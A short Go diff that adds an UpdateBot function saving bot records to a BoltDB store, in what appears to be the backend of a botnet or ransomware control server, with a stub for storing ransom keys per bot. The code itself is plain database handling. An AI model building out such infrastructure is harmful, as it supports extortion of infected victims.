@@ -51,6 +51,21 @@ func (c *Client) AddBot(b *botnet.Bot) (*botnet.Bot, error) {
 	return b, nil
 }
 
+//UpdateBot is
+func (c *Client) UpdateBot(b *botnet.Bot) (*botnet.Bot, error) {
+	bytesBot, err := b.Bytes()
+	if err != nil {
+		return nil, err
+	}
+	if err := c.DB.Update(func(tx *bolt.Tx) error {
+		bu := tx.Bucket([]byte(botsBucket))
+		return bu.Put(b.ID, bytesBot)
+	}); err != nil {
+		return nil, err
+	}
+	return b, nil
+}
+
 //AddRansomKey is
 func (c *Client) AddRansomKey(botID, key []byte) error {
 	return nil
